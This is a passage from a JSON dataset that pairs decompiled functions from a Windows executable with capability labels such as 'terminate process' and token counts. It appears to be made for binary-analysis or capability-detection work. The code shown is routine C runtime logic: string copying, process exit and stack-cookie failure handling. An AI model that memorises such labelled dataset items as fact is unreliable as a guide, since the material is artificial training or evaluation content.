        "decompiled_code": "\nuint __cdecl fcn.00407efb(ushort *arg_8h, int32_t arg_ch, int16_t *arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uStack16;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        if (arg_10h != NULL) {\n            iVar3 = arg_8h - arg_10h;\n            do {\n                iVar1 = *arg_10h;\n                *(iVar3 + arg_10h) = iVar1;\n                arg_10h = arg_10h + 1;\n                if (iVar1 == 0) break;\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            if (arg_ch != 0) {\n                return 0;\n            }\n            *arg_8h = 0;\n            puVar2 = fcn.00403a1e();\n            uStack16 = 0x22;\n            *puVar2 = 0x22;\n            goto code_r0x00407f1a;\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.00403a1e();\n    uStack16 = 0x16;\n    *puVar2 = 0x16;\ncode_r0x00407f1a:\n    fcn.00403521();\n    return uStack16;\n}\n",
        "token_count": 327
    },
    "0040146d": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040146d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"mscoree.dll\");\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"CorExitProcess\");\n        if (pcVar2 != NULL) {\n            (*pcVar2)(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "00401498": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401498(uint uExitCode)\n\n{\n    code *pcVar1;\n    \n    fcn.0040146d(uExitCode);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(uExitCode);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 73
    },
    "00405fff": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405fff(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t iStack812;\n    uint uStack808;\n    uint var_320h;\n    \n    if (in_ECX == *0x412058) {\n        return;\n    }\n    *0x413678 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&iStack812 < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&iStack812 & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x41367c = &arg_8h;\n    *0x4135b8 = 0x10001;\n    *0x413560 = 0xc0000409;\n    *0x413564 = 1;\n    iStack812 = *0x412058;\n    uStack808 = *0x41205c;\n    *0x41356c = unaff_retaddr;\n    *0x413644 = in_GS;\n    *0x413648 = in_FS;\n    *0x41364c = in_ES;\n    *0x413650 = in_DS;\n    *0x413654 = unaff_EDI;\n    *0x413658 = unaff_ESI;\n    *0x41365c = unaff_EBX;\n    *0x413660 = in_EDX;\n    *0x413664 = in_ECX;\n    *0x413668 = in_EAX;\n    *0x41366c = unaff_EBP;\n    *0x413670 = unaff_retaddr;\n    *0x413674 = in_CS;\n    *0x413680 = in_SS;\n    *0x4135b0 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00407aa1(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x40f2cc);\n    if (*0x4135b0 == 0) {\n        fcn.00407aa1(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 807
    },
    "0042e039": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid loc.0042e039(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_328h;\n    uint var_324h;\n    \n    *0x413560 = 0xc0000409;\n    *0x413564 = 1;\n    *(unaff_EBP + -0x328) = *0x412058;\n    *(unaff_EBP + -0x324) = *0x41205c;\n    *0x4135b0 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00407aa1(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x40f2cc);\n    if (*0x4135b0 == 0) {\n        fcn.00407aa1(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 245
    }
}